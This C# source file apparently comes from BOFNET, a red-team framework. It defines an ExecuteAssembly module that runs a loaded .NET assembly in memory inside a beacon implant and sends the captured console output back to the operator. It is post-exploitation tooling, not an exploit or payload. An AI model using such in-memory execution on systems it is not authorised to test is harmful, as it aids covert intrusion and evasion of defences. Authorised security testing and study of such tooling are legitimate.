﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;

namespace BOFNET.Bofs {
    public class ExecuteAssembly : BeaconObject {
        public ExecuteAssembly(BeaconApi api) : base(api) { }

        public override void Go(string[] args) {
            if (args.Length == 0) {
                BeaconConsole.WriteLine("[!] Cannot continue execution, no .NET assembly specified to run");
                return;
            }

            if (Runtime.Jobs.Values.Where(p => p.StandardAssembly != null && p.Thread.IsAlive).Count() > 0) {
                BeaconConsole.WriteLine("[!] Cannot continue execution, unable to execute while a bofnet_job_assembly instance is active");
                return;
            }

            if (Runtime.LoadedAssemblies.ContainsKey(args[0])) {
                // Redirect stdout to MemoryStream
                var memStream = new MemoryStream();
                var memStreamWriter = new StreamWriter(memStream);
                memStreamWriter.AutoFlush = true;
                Console.SetOut(memStreamWriter);
                Console.SetError(memStreamWriter);

                // Call entry point
                Assembly assembly = Runtime.LoadedAssemblies[args[0]].Assembly;
                object[] mainArguments = new[] { args.Skip(1).ToArray() };
                object execute = assembly.EntryPoint.Invoke(null, mainArguments);

                // Write MemoryStream to Beacon output
                BeaconConsole.WriteLine(Encoding.ASCII.GetString(memStream.ToArray()));
            }
            else {
                BeaconConsole.WriteLine("[!] Cannot continue execution, specified .NET assembly not loaded");
            }
        }
    }
}